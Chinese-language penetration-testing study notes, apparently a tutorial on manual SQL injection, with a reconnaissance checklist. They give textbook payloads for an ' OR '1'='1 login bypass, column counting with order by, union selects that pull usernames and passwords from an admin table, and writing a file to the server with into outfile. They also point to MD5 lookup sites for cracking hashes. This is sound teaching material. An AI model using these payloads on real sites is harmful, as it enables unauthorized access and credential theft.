[TOC]



渗透测试步骤

1. 信息收集：whois信息收集，端口扫描，寻找旁站，目录扫描，指纹识别，内容敏感信息泄露
2. 



---

# SQL Injection

- 通过构造**SQL语句**实现对**数据库**的操作
- 条件：1. 参数用户可控 2. 构造的参数带入数据库查询

```
?id=1' union select 1,2,'xxx injection content' into outfile 'xxx.html'%23
and 1=2 union select 1,concat(username,password) from admin
```



> i.zkaq.org

## SQL手动注入

sql手注一般流程

1. 判断注入点
2. 判断字段数
3. 判断回显点
4. 查询相关内容

demo

某个网站的登录验证的SQL查询代码为

```
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

恶意填入

```
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
```

时，将导致原本的SQL字符串被填为

```
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

也就是实际上运行的SQL命令会变成下面这样的

```
strSQL = "SELECT * FROM users;"
```

因此达到无账号密码，亦可登录网站。所以SQL注入被俗称为黑客的填空游戏。



判断字段数

```
order by 5 // 若正常
order by 6 // 若不正常
那么网页有5个字段
```



判断回显点

```
union select 1,2,3,4,5 from admin //页面上显示了1 2 3 4 5的地方即回显点
union select 1,username,password,4,5 from admin //在有回显的地方，输入字段名(username,password为猜测出来的)
```





```
//md5查表
www.cmd5.com
md5jiami.51240.com
```









































